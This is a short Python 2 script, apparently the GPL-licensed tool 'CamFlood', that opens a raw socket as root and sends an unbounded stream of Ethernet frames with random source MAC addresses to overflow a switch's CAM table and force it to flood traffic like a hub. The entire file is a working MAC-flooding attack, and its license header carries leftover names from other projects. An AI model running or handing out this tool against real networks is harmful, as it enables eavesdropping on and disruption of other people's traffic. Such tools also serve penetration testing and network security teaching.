#!/usr/bin/env python
"""
    Tool that sends out layer 2 frames with alternating source mac adresses, with the intention of filling up the cam table of a switch dropping it to hub mode
    Copyright (C) 2015  Bram Staps (Glasswall B.V.)

    This file is part of CamFlood
    CamFlood is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    Dhcpgag is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
"""

import argparse
import os
import sys
import random
import struct
from time import sleep

import socket


parser = argparse.ArgumentParser()
parser.add_argument("interface", help="The sending interface", type=str)
parser.add_argument("--mac", help="which mac to send to (default = Broadcast)")
parser.add_argument("--interval", help="interval between packets in seconds (default = 0, 0 = as fast as possible)")
parser.add_argument("--count", help="How Manny packets to send in total (default = 0, 0 = infinite)")

args = parser.parse_args()

if os.geteuid():
    sys.stderr.write("You need to be root.")
    exit(1)

mac = "FF:FF:FF:FF:FF:FF"
if args.mac: mac = args.mac

interval = 0
if args.interval: interval = args.interval
    
count = 0
if args.count: count = int(args.count)


#default behaviour is "spoofing" your own ip with your own mac

prelogue = mac.replace(":", "").decode("hex")
epilogue = "1337FFFFFFFFFFFF".decode("hex")

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind((args.interface,0))  
    

def loop():
    sock.send(prelogue + struct.pack("L", random.getrandbits(8*6) & 0xFFFFFFFFFFFE )[:6] + epilogue)
    if interval: sleep(interval)
        
if count:
    for x in xrange(count):
        loop()
else:
    while True:
        loop()
